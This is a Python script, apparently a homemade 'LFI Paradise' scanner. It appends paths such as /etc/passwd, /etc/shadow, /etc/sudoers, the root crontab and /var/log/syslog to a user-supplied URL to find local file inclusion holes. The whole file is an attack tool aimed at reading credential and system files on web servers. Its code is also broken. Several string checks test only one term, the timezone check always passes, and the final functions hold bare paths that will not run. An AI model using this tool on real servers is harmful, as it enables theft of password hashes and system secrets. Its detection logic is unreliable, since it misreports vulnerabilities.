from os import error
import requests
import pyfiglet

banner = pyfiglet.figlet_format("LFI . PARADISE")
print(banner)

linea = "----------------------------------------------------"

def url_scan(): 
    global url
    global respuesta
    global respuesta_bien
    url = input("Put Scan: (Example: http://192.168.0.125/mutillidae/?page=) ")
    respuesta = requests.get(url)
    respuesta_bien = respuesta.status_code
    print(respuesta_bien)
    if respuesta_bien == 200:
        print("Correct URL")
        print(linea)
        print("Starting Scan to...",url)
        print(linea)
        print("Results:")
    elif error:
        print("Invalid URL")
    else:
        print("Incorrect URL")

url_scan()


def etc_passwd():
    add = "/etc/passwd"
    final_url = url + add
    respuesta = requests.get(final_url)
    if respuesta_bien == 200:
        if "root" and "bin" in respuesta.text:
            print("LFI Vulnerabilitie in:",final_url)
        elif "404" in respuesta.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")



etc_passwd()

def etc_shadow():
    add1 = "/etc/shadow"
    final_url1 = url + add1
    respuesta1 = requests.post(final_url1)
    if respuesta_bien == 200:
        if "root" and "daemon" and "bin" in respuesta1.text:
            print("LFI Vulnerabilitie in:",final_url1)
        elif "404" in respuesta1.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")

etc_shadow()

def crontabs():
    add2 = "/var/spool/cron/crontabs/root"
    final_url2 = url + add2
    respuesta2 = requests.post(final_url2)
    if respuesta_bien == 200:
        if "For more information see the manual pages of crontab(5) and cron(8)" in respuesta2.text:
            print("LFI Vulnerabilitie in:",final_url2)
        elif "404" in respuesta2.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")

crontabs()

def etc_group():
    add3 = "/etc/group"
    final_url3 = url + add3
    respuesta3 = requests.post(final_url3)
    if respuesta_bien == 200:
        if "root" and "daemon" and "bin" in respuesta3.text:
            print("LFI Vulnerabilitie in:",final_url3)
        elif "404" in respuesta3.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")

etc_group()


def netplan():
    add4 = "/etc/netplan/01-network-manager-all.yaml"
    final_url4 = url + add4
    respuesta4 = requests.post(final_url4)
    if respuesta_bien == 200:
        if "network" and "version" in respuesta4.text:
            print("LFI Vulnerabilitie in:",final_url4)
        elif "404" in respuesta4.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")
    
netplan()

def etc_sudoers():
    add4 = "/etc/sudoers"
    final_url4 = url + add4
    respuesta4 = requests.post(final_url4)
    if respuesta_bien == 200:
        if "root" and "ALL" in respuesta4.text:
            print("LFI Vulnerabilitie in:",final_url4)
        elif "404" in respuesta4.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")

etc_sudoers()

def etc_grub():
    add4 = "/etc/grub.d/20memtest86+"
    final_url4 = url + add4
    respuesta4 = requests.post(final_url4)
    if respuesta_bien == 200:
        if "bin" and "bash" in respuesta4.text:
            print("LFI Vulnerabilitie in:",final_url4)
        elif "404" in respuesta4.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")
        
etc_grub()


def etc_timezone():
    add4 = "/etc/timezone"
    final_url4 = url + add4
    respuesta4 = requests.post(final_url4)
    if respuesta_bien == 200:
        if "US" or "SP" or "Eastern" or "Western" or "FR" or "UK" or "CH" or "CA" in respuesta4.text:
            print("LFI Vulnerabilitie in:",final_url4)
        elif "404" in respuesta4.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")
        
etc_timezone()


def syslog():
    add4 = "/var/log/syslog"
    final_url4 = url + add4
    respuesta4 = requests.post(final_url4)
    if respuesta_bien == 200:
        if "systemd" and "info" and "uid" in respuesta4.text:
            print("LFI Vulnerabilitie in:",final_url4)
        elif "404" in respuesta4.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")

syslog()

def environ():
    /proc/self/environ

def cmd():
    /proc/self/cmdline

def status():
    /proc/self/status

